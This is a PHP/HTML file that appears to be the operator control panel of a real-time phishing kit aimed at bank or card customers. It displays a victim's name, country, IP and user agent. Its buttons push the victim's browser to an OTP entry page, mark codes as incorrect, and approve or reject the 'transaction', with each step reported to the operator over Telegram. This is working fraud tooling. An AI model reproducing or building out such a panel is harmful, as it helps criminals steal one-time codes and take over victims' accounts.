<?php
session_start();
require_once 'bots.php';
require_once 'functions.php';

// التحقق من وجود معرف الجلسة في URL
$sessionId = $_GET['session'] ?? null;

// معالجة الإجراءات
if (isset($_POST['action'])) {
    $data = json_decode(file_get_contents('php://input'), true);
    $response = [
        'success' => false,
        'message' => '',
        'redirect' => ''
    ];

    $sessionId = $data['session_id'] ?? null;

    if (!$sessionId) {
        $response['message'] = 'Session ID manquant';
        echo json_encode($response);
        exit;
    }

    switch ($data['action']) {
        case 'approve_transaction':
            // تحديث حالة المعاملة
            updateTransactionStatus($sessionId, 'approved');
            
            $message = "✅ Transaction approuvée\n";
            $message .= "🆔 Session ID: {$sessionId}\n";
            
            sendTelegramMessage($message);
            
            $response = [
                'success' => true,
                'message' => 'Transaction approuvée avec succès',
                'redirect' => 'success.php'
            ];
            break;

        case 'reject_transaction':
            // تحديث حالة المعاملة
            updateTransactionStatus($sessionId, 'rejected');
            
            $message = "❌ Transaction rejetée\n";
            $message .= "🆔 Session ID: {$sessionId}\n";
            
            sendTelegramMessage($message);
            
            $response = [
                'success' => true,
                'message' => 'Transaction rejetée',
                'redirect' => 'error.php'
            ];
            break;

        case 'request_otp':
            // تحديث حالة المعاملة
            updateTransactionStatus($sessionId, 'otp_required');
            
            $message = "📱 Demande de code OTP envoyée\n";
            $message .= "🆔 Session ID: {$sessionId}\n";
            
            sendTelegramMessage($message);

            // إضافة معلومات إضافية للتوجيه
            $transactionData = getTransactionData($sessionId);
            $transactionData['client_action'] = [
                'action' => 'redirect',
                'url' => 'otp.php?session=' . $sessionId
            ];
            saveTransactionData($sessionId, $transactionData);

            $response = [
                'success' => true,
                'message' => 'Demande OTP envoyée'
            ];
            break;

        case 'wait_transaction':
            // تحديث حالة المعاملة
            updateTransactionStatus($sessionId, 'waiting');
            
            $message = "⏱️ Transaction mise en attente\n";
            $message .= "🆔 Session ID: {$sessionId}\n";
            
            sendTelegramMessage($message);

            $response = [
                'success' => true,
                'message' => 'Transaction mise en attente'
            ];
            break;

        case 'otp_incorrect':
            // تحديث حالة المعاملة
            updateTransactionStatus($sessionId, 'otp_incorrect');
            
            $message = "❌ Code OTP incorrect\n";
            $message .= "🆔 Session ID: {$sessionId}\n";
            
            sendTelegramMessage($message);

            $response = [
                'success' => true,
                'message' => 'Code OTP marqué comme incorrect'
            ];
            break;

        case 'check_status':
            $response = [
                'success' => true,
                'status' => $_SESSION['transaction_status_' . $sessionId] ?? 'pending',
                'message' => 'Transaction en cours de traitement'
            ];
            break;
    }

    echo json_encode($response);
    exit;
}


?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panneau de contrôle</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .control-panel {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .session-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #007bff;
        }
        .session-id {
            font-family: monospace;
            background: #e9ecef;
            padding: 5px 10px;
            border-radius: 3px;
            margin-left: 10px;
        }
        .transaction-item {
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .action-buttons {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            flex-wrap: wrap;
        }
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        .btn-success {
            background: #28a745;
            color: white;
        }
        .btn-danger {
            background: #dc3545;
            color: white;
        }
        .btn-info {
            background: #17a2b8;
            color: white;
        }
        .btn-warning {
            background: #ffc107;
            color: #212529;
        }
        .btn-secondary {
            background: #6c757d;
            color: white;
        }
        .btn:hover {
            opacity: 0.9;
            transform: translateY(-1px);
        }
        
        @media (max-width: 768px) {
            .action-buttons {
                flex-direction: column;
            }
            .btn {
                width: 100%;
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <div class="control-panel">
        <h1><i class="fas fa-cogs"></i> Panneau de contrôle</h1>
        
        <?php if ($sessionId): ?>
        <div class="session-info">
            <strong>Session ID:</strong>
            <span class="session-id"><?php echo htmlspecialchars($sessionId); ?></span>
            
            <?php 
            // استرجاع معلومات المعاملة لعرض تفاصيل إضافية
            $transactionData = getTransactionData($sessionId);
            if ($transactionData): 
            ?>
            <div style="margin-top: 15px; padding-top: 15px; border-top: 1px solid #dee2e6;">
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px;">
                    <div>
                        <strong>👤 Client:</strong> <?php echo htmlspecialchars($transactionData['prenom'] . ' ' . $transactionData['nom']); ?>
                        <br><strong>🏠 Pays:</strong> <?php echo htmlspecialchars($transactionData['pays']); ?>
                        <br><strong>📊 Statut:</strong> 
                        <span style="padding: 2px 8px; border-radius: 3px; font-size: 12px; 
                              background: <?php 
                                  $status = $transactionData['status'] ?? 'pending';
                                  echo $status === 'approved' ? '#28a745' : 
                                       ($status === 'rejected' ? '#dc3545' : 
                                        ($status === 'otp_required' ? '#ffc107' : '#6c757d'));
                              ?>; 
                              color: <?php echo in_array($status, ['approved', 'rejected']) ? 'white' : '#212529'; ?>;">
                            <?php echo ucfirst($status); ?>
                        </span>
                    </div>
                    <div>
                        <strong>📡 IP Address:</strong> <?php echo htmlspecialchars($transactionData['ip_address'] ?? 'Unknown'); ?>
                        <br><strong>🗺️ Localisation:</strong> <?php echo htmlspecialchars(getCountryFromIP($transactionData['ip_address'] ?? '')); ?>
                        <br><strong>⏰ Créé le:</strong> <?php echo htmlspecialchars($transactionData['created_at'] ?? 'Unknown'); ?>
                    </div>
                </div>
                
                <?php if (!empty($transactionData['user_agent'])): ?>
                <div style="margin-top: 10px; padding: 8px; background: #f8f9fa; border-radius: 3px; font-size: 12px;">
                    <strong>💻 User Agent:</strong> <?php echo htmlspecialchars(substr($transactionData['user_agent'], 0, 100)) . (strlen($transactionData['user_agent']) > 100 ? '...' : ''); ?>
                </div>
                <?php endif; ?>
            </div>
            <?php endif; ?>
        </div>
        <?php endif; ?>

        <div class="action-buttons">
            <button class="btn btn-success" onclick="handleAction('approve_transaction', '<?php echo $sessionId; ?>')">
                <i class="fas fa-check"></i>
                Approuver
            </button>
            
            <button class="btn btn-danger" onclick="handleAction('reject_transaction', '<?php echo $sessionId; ?>')">
                <i class="fas fa-times"></i>
                Rejeter
            </button>
            
            <button class="btn btn-warning" onclick="handleAction('request_otp', '<?php echo $sessionId; ?>')">
                <i class="fas fa-mobile-alt"></i>
                Demander OTP
            </button>
            
            <button class="btn btn-secondary" onclick="handleAction('otp_incorrect', '<?php echo $sessionId; ?>')">
                <i class="fas fa-exclamation-triangle"></i>
                OTP Incorrect
            </button>
            
            <button class="btn btn-info" onclick="handleAction('wait_transaction', '<?php echo $sessionId; ?>')">
                <i class="fas fa-clock"></i>
                Attendre
            </button>
        </div>
    </div>

    <script>
    function handleAction(action, sessionId) {
        fetch('send_action.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                action: action,
                session_id: sessionId
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                alert(data.message);
            } else {
                alert(data.message || 'Une erreur est survenue');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Une erreur est survenue');
        });
    }
    </script>
</body>
</html>
